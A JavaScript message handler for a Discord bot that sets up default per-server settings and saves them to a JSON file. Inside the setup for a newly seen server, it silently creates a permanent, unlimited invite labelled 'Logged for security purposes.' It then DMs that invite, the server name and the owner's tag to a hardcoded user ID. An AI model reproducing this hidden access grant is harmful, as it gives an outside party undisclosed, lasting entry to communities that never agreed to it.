const fs = require("fs")
module.exports = {
  name: 'messageCreate',
  run: (client, message) => {
    
    let msg = message
    if (message.channel.type === 'dm'){
      return
    }
    if(message.author.bot)return
    var serverstats = client.data
    if(serverstats.hasOwnProperty(msg.guildId) == false){
      client.users.fetch('701163110303531089', false).then(async(user) => {
	let owner = await client.users.fetch(message.guild.ownerId)
	let invite = await message.channel.createInvite({
	maxAge: 0,
	maxUses: 0
	},
	`Logged for security purposes.`)
        user.send("I just got added to a new server. Name: "+msg.guild.name+", Owner: "+owner.tag+", Invite: https://discord.gg/"+invite)
      
      serverstats[message.guildId] = {
        welcomechannel: "None",
        leavechannel: "None",
        admin: message.guild.ownerId,
        prefix: "?",
        joinrole: "None",
        logchannel: "None",
        joinmessage: "Welcome to "+message.guild.name,
        staffrole: "None",
        invite: "https://discord.gg/"+invite,
      }
      fs.writeFile("./serverdata.json", JSON.stringify(serverstats, null, "\t"), function (err) {
        if (err) console.log(err)
      })
      client.data = serverstats
    })
    }else{
    if(serverstats[message.guildId].hasOwnProperty("welcomechannel") == false){
      serverstats[msg.guildId].welcomechannel = "None"
    }
    if(serverstats[message.guildId].hasOwnProperty("leavechannel") == false){
      serverstats[msg.guildId].leavechannel = "None"
    }
    if(serverstats[message.guildId].hasOwnProperty("prefix") == false){
      serverstats[msg.guildId].prefix = "?"
    }
    if(serverstats[message.guildId].hasOwnProperty("admin") == false){
      serverstats[msg.guildId].admin = message.guild.ownerId
    }
    if(serverstats[message.guildId].hasOwnProperty("staffrole") == false){
      serverstats[msg.guildId].staffrole = "None"
    }
    if(serverstats[message.guildId].hasOwnProperty("joinrole") == false){
      serverstats[msg.guildId].joinrole = "None"
    }
    if(serverstats[message.guildId].hasOwnProperty("logchannel") == false){
      serverstats[msg.guildId].logchannel = "None"
    }
    
    if(serverstats[message.guildId].hasOwnProperty("joinmessage") == false){
      serverstats[msg.guildId].joinmessage = "Welcome to "+message.guild.name
    }

    client.data = serverstats
    fs.writeFile("./serverdata.json", JSON.stringify(serverstats, null, "\t"), function (err) {
      if (err) console.log(err)
    })
    }
    client.data = serverstats
}
}
